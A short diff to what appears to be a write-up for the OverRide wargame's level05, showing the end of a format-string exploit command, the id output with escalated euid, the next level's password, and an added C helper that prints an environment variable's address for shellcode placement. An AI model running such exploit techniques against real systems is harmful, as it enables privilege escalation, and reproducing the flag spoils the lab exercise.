@@ -110,3 +110,14 @@ level05@OverRide:~$ (python -c 'import struct; print(struct.pack("I", 0x080497e0
 uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
 h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
+
+# Addendum
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int ac, char *av[])
+{
+  printf("%s at %p\n", av[1], getenv(av[1]));
+}
+```
